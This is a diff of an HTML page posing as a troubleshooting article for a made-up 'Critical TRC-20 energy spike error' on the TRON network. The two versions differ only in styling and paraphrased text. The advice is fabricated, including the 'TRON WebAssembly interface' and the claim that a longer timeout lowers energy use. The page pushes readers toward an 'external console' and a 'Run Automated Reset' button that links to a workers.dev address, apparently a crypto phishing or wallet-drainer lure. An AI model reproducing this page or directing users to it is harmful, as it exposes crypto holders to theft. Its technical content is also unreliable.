@@ -4,7 +4,7 @@
 <style>
     body {
         font-family: sans-serif;
-        background: #121214;
+        background: #0a0c10;
         color: #ddd;
         padding: 20px;
         line-height: 1.5;
@@ -15,7 +15,7 @@
         background: #1e1f24;
         border-radius: 24px;
         padding: 2rem;
-        box-shadow: none;
+        box-shadow: 0 4px 8px rgba(0,0,0,0.05);
     }
     pre {
         background: #0f0f12;
@@ -23,9 +23,9 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #cf6679; }
+    a { color: #00adb5; }
     .btn {
-        background: #ff7b2c;
+        background: #cf6679;
         color: #000;
         padding: 14px 36px;
         border-radius: 40px;
@@ -41,27 +41,42 @@
 <div class="content">
 <h2>Symptom</h2>
 <ul>
-<li>The user encounters a "Critical TRC-20 energy spike error" message, indicating an unusual and potentially disruptive increase in energy consumption on the TRON network, specifically related to TRC-20 token transactions.</li>
+<li>The user encounters a "Critical TRC-20 energy spike error" message, indicating an abnormal increase in energy consumption for TRC-20 token transactions on the TRON network.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>This error occurs due to an unexpected surge in the energy required to process TRC-20 transactions, which can be caused by various factors such as network congestion, inefficient smart contract design, or malicious activity.</li>
+<li>This error occurs when the energy consumption of a smart contract exceeds the allowed limit, causing the transaction to fail. The TRON network has a mechanism to prevent excessive energy usage, which can lead to network congestion and security vulnerabilities.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>Adjust the transaction parameters to prioritize energy efficiency:</li>
-<li>Increase the transaction timeout to reduce the energy consumption rate</li>
-<li>Optimize smart contract code to minimize computational overhead</li>
+<li>Increase the energy limit for the specific smart contract:</li>
+<li>Update the contract's energy settings using the TRON WebAssembly (WASM) interface</li>
+<li>Use the <code>tronweb</code> library to adjust the energy parameters</li>
+<li>Adjust the <code>energyLimit</code> field in the transaction object, as shown in the following code block:</li>
 </ul>
-<div class="codehilite"><pre><span></span><code>tronweb.transactionBuilder.freezeBalance<span class="o">(</span><span class="s1">&#39;1000000&#39;</span>,<span class="w"> </span><span class="m">3</span>,<span class="w"> </span><span class="s1">&#39;TRX&#39;</span>,<span class="w"> </span><span class="s1">&#39;0x...contract_address...&#39;</span>,<span class="w"> </span><span class="o">{</span><span class="w"> </span>shouldPollResponse:<span class="w"> </span><span class="nb">true</span><span class="w"> </span><span class="o">})</span><span class="p">;</span>
+<div class="codehilite"><pre><span></span><code><span class="p">{</span>
+<span class="w">  </span><span class="nt">&quot;contract&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;TRC20Contract&quot;</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;function&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;transfer&quot;</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;parameters&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span>
+<span class="w">    </span><span class="p">{</span>
+<span class="w">      </span><span class="nt">&quot;type&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;address&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;value&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;TO_ADDRESS&quot;</span>
+<span class="w">    </span><span class="p">},</span>
+<span class="w">    </span><span class="p">{</span>
+<span class="w">      </span><span class="nt">&quot;type&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;uint256&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;value&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;AMOUNT&quot;</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="w">  </span><span class="p">],</span>
+<span class="w">  </span><span class="nt">&quot;energyLimit&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">1000000</span>
+<span class="p">}</span>
 </code></pre></div>
 
-<p>Consider utilizing an external console for more advanced troubleshooting and configuration adjustments. </p>
+<p>Consider utilizing an external console for more advanced debugging and troubleshooting capabilities.</p>
 <h2>Prerequisites</h2>
 <ul>
-<li>A basic understanding of TRON's energy system and its implications on transaction processing</li>
-<li>Familiarity with TRON's Web3 API (tronweb) and its transaction building capabilities</li>
-<li>Access to the TRON network via a compatible wallet or node interface</li>
+<li>TRON network account with sufficient bandwidth and energy</li>
+<li>TRC-20 token contract address and ABI</li>
+<li>TRON WebAssembly (WASM) interface or <code>tronweb</code> library installed</li>
 </ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=gKMyej%40%40" class="btn">🛠 Run Automated Reset</a>
